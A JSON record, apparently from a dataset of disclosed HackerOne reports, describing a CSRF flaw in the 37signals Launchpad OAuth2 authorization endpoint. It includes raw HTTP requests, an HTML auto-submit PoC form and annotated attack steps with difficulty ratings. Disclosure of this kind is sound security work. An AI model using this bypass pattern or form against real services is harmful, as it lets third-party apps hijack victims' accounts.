{
    "reported_to": "Basecamp",
    "reported_by": "carbon61 ",
    "title": "CSRF on launchpad.37signals.com OAuth2 authorization endpoint",
    "content": "\nHi,\nI found a CSRF in the OAuth2 authorization endpoint on launchpad.37signals.com. That allows a malicious 3rd party application to gain full API access to victim's account in 37signals products that uses OAuth2 authorization.\nI found that when making a post request to authorization endpoint it does not check the \"authenticity token\" if you add \" .json or .xml \" like this \"authorization.json\" .\npost request:\nCode 742 Bytes\n1POST /authorization.json HTTP/1.1\n2Host: launchpad.37signals.com\n3Connection: close\n4Content-Length: 168\n5Cache-Control: max-age=0\n6Origin: null\n7Upgrade-Insecure-Requests: 1\n8Content-Type: application/x-www-form-urlencoded\n9User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36\n10Sec-Fetch-Dest: document\n11Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n12Sec-Fetch-Site: same-origin\n13Sec-Fetch-Mode: navigate\n14Sec-Fetch-User: ?1\n15Accept-Encoding: gzip, deflate\n16Accept-Language: en-US,en;q=0.9\n17Cookie: _beanstalk_uuid=\n18\n19client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit=\n20\nAfter a 3rd party application gets the authorization code from redirect_uri, it can then exchange it for an access token. and get full access to the api.\nrequest to get the access token:\nCode 732 Bytes\n1POST /authorization/token HTTP/1.1\n2Host: launchpad.37signals.com\n3Connection: close\n4Upgrade-Insecure-Requests: 1\n5User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36\n6Sec-Fetch-Dest: document\n7Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n8Sec-Fetch-Site: none\n9Sec-Fetch-Mode: navigate\n10Accept-Encoding: gzip, deflate\n11Accept-Language: en-US,en;q=0.9\n12Cookie: _beanstalk_uuid=\n13Content-Type: application/x-www-form-urlencoded\n14Content-Length: 214\n15\n16type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}\n17\nPoC:\n1- you will need to register on the 37Signals Integration Portal.\n2- Login to any 37Signals apps that uses the OAuth2 authorization for example basecamp 3 account. (i tested it using basecamp 3 )\n3- for testing , submit the following form through the browser in which you are logged in:\nCode 485 Bytes\n1<form action=\"https://launchpad.37signals.com/authorization.json\" method=\"POST\">\n2      <input type=\"hidden\" name=\"client&#95;id\" value=\"{your-client-id}\" />\n3      <input type=\"hidden\" name=\"client&#95;secret\" value=\"\" />\n4      <input type=\"hidden\" name=\"type\" value=\"web&#95;server\" />\n5      <input type=\"hidden\" name=\"redirect&#95;uri\" value=\"{your-redirect-uri}\" />\n6      <input type=\"hidden\" name=\"commit\" value=\"\" />\n7      <input type=\"submit\" value=\"Submit request\" />\n8    </form>\nyou will get the {authorization-code} so you can exchange it for an access token\nNote that a real attack does not require user interaction.\nImpact\nThrough this vulnerability an attacker can do malicious actions on the victim's account\nfull API access to victim's account\n\n",
    "severity": [
        8.1,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-Site Request Forgery (CSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1604097300,
    "report_url": "https://hackerone.com/reports/850022",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Register on the 37Signals Integration Portal to obtain a client_id and redirect_uri."
        ],
        [
            2,
            "Login to a 37Signals app (e.g., Basecamp 3) that uses OAuth2 authorization."
        ],
        [
            3,
            "Submit a crafted form (or POST request) to https://launchpad.37signals.com/authorization.json with the client_id and redirect_uri."
        ],
        [
            4,
            "Intercept the authorization code from the redirect_uri and exchange it for an access token via a POST request to /authorization/token."
        ]
    ],
    "vuln_description": "A CSRF vulnerability exists in the OAuth2 authorization endpoint on launchpad.37signals.com, allowing a malicious third-party application to gain full API access to a victim's account by bypassing the authenticity token check when the endpoint is accessed with .json or .xml extensions.",
    "reason": "The attack involves understanding OAuth2 flow, CSRF, and the subtle bypass of authenticity token checks via endpoint manipulation (.json/.xml). However, the components (OAuth2, CSRF) are well-known, and the bypass method, while not immediately obvious, follows predictable patterns in web security flaws.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}